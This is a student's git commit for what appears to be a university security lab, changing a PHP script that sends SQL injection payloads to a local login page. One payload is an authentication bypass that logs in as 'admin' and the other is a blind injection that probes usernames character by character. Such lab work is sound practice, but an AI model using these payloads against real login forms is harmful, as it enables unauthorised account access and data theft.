9f89c81bd56fe7b92caaf487ed9f05b585e8dbe6
KendalYaman <kendal.yaman.001@student.uni.lu>
2019-05-16 11:20:48 +0200

    test

--- script.php
+++ script.php
@@ -1,6 +1,6 @@
 <?php
-//$url="http://localhost/lab09/login.php?u=\"%20or%20username%20=%20%27admin%27%20--%20";
-$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%and%20SUBSTRING(username,1,1)%20=%20char(42)%20--%20";
+$url="http://localhost/lab09/login.php?u=\"%20or%20username%20=%20%27admin%27%20--%20";
+//$url="http://localhost/lab09/login.php?u=\"%20or%20id%20=%2098%and%20SUBSTRING(username,1,1)%20=%20char(42)%20--%20";
 $result = file_get_contents($url);
 
 print($result);
